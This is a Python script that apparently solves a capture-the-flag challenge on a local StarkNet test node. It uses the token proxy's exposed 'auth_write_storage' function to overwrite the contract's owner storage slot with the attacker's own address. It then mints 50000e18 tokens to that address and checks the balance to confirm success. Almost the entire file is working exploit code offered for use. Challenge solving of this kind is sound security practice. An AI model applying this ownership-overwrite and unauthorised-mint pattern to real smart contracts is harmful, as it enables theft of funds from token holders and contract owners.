import asyncio
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.networks import TESTNET, MAINNET
from pathlib import Path
from starknet_py.net import AccountClient, KeyPair
from starknet_py.net.models.chains import StarknetChainId
from starknet_py.net.signer.stark_curve_signer import StarkCurveSigner
from starknet_py.contract import Contract
from starkware.python.utils import to_bytes
from starkware.starknet.public.abi import starknet_keccak
from starkware.starknet.core.os.contract_address.contract_address import \
    calculate_contract_address_from_hash

testnet = "testnet"
chain_id = StarknetChainId.TESTNET


async def main():
    node_url = "http://a9b9a393-c60b-4f8b-bbc0-3053b1246ce1@127.0.0.1:5050"
    contractAddress = "0x7261f31015854d7e2767877412717980fe06273b707ad0d8c4e8741b1e8a305"
    private_key = "0x219a7055678392af67e420d5bb7057e1"

    gateway_client = GatewayClient(node_url, TESTNET)

    key_pair = KeyPair.from_private_key(key=int(private_key, 16))
    print(key_pair)

    player_public_key = key_pair.public_key
    print("Player public key", player_public_key)

    player_address = calculate_contract_address_from_hash(
        salt=20,
        class_hash=1803505466663265559571280894381905521939782500874858933595227108099796801620,
        constructor_calldata=[player_public_key],
        deployer_address=0,
    )
    print("Player address", player_address, hex(player_address))

    signer = StarkCurveSigner(player_address, key_pair, StarknetChainId.TESTNET)
    account_client = AccountClient(client=gateway_client,
                                   address=player_address, signer=signer)

    proxyContract = Contract(address=contractAddress, abi=abi,
                               client=account_client)
    balance = (await proxyContract.functions["balanceOf"].call(1337)).balance
    print("Other balance", balance)

    ownerVarAddress = starknet_keccak(b"owner")
    print("OwnerVar address", ownerVarAddress)


    response = await account_client.execute(
        calls=[
            proxyContract.functions["auth_write_storage"].prepare(player_address, ownerVarAddress, player_address)
        ],
        max_fee=int(0)
    )
    status = await account_client.wait_for_tx(response.transaction_hash)
    print(status)
    print(response)

    response = await account_client.execute(calls=[proxyContract.functions["mint"].prepare(player_address, int(50000e18))], max_fee=int(0))
    print(status)
    print(response)


    balance = (await proxyContract.functions["balanceOf"].call(player_address)).balance
    print("My balnace", balance)

    if (balance == int(50000e18)):
        print("SOLVED!")


abi = [
    {
        "members": [
            {
                "name": "low",
                "offset": 0,
                "type": "felt"
            },
            {
                "name": "high",
                "offset": 1,
                "type": "felt"
            }
        ],
        "name": "Uint256",
        "size": 2,
        "type": "struct"
    },
    {
        "inputs": [
            {
                "name": "owner_account",
                "type": "felt"
            },
            {
                "name": "initial_supply",
                "type": "Uint256"
            }
        ],
        "name": "initialize",
        "outputs": [],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "account",
                "type": "felt"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "Uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "recipient",
                "type": "felt"
            },
            {
                "name": "amount",
                "type": "Uint256"
            }
        ],
        "name": "transfer",
        "outputs": [],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "recipient",
                "type": "felt"
            },
            {
                "name": "amount",
                "type": "Uint256"
            }
        ],
        "name": "mint",
        "outputs": [],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "account",
                "type": "felt"
            },
            {
                "name": "amount",
                "type": "Uint256"
            }
        ],
        "name": "burn",
        "outputs": [],
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "auth_account",
                "type": "felt"
            },
            {
                "name": "address",
                "type": "felt"
            }
        ],
        "name": "auth_read_storage",
        "outputs": [
            {
                "name": "value",
                "type": "felt"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "name": "auth_account",
                "type": "felt"
            },
            {
                "name": "address",
                "type": "felt"
            },
            {
                "name": "value",
                "type": "felt"
            }
        ],
        "name": "auth_write_storage",
        "outputs": [],
        "type": "function"
    }
]

if __name__ == '__main__':
    asyncio.run(main())
